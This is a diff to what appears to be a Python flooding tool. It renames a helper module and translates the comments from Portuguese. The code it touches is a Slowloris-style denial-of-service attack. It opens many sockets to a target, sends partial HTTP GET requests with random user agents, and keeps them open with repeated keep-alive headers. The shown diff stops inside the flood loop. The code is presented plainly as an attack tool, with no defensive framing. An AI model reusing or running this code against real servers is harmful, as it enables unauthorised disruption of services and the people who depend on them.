@@ -1,13 +1,12 @@
-# Importa os modulos
 import random
 import socket
 
 from colorama import Fore
 
-import tools.randomData as randomData
+import tools.random_data as random_data
 
 
-# Socket inicial
+# Initial socket
 def create_socket(target):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -18,7 +17,7 @@ def create_socket(target):
             "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
         )
         sock.send(
-            "User-Agent: {}\r\n".format(randomData.random_useragent()).encode("utf-8")
+            "User-Agent: {}\r\n".format(random_data.random_useragent()).encode("utf-8")
         )
         sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
     except socket.timeout:
@@ -33,14 +32,16 @@ def create_socket(target):
 
 
 def flood(target):
-    # Criar sockets
+
+    # Creates sockets
     sockets = []
     for _ in range(random.randint(20, 60)):
         sock = create_socket(target)
         if not sock:
             continue
         sockets.append(sock)
-    # Envia headers keep-alive
+
+    # Sends headers keep-alive
     for _ in range(4):
         for index, sock in enumerate(sockets):
             try:
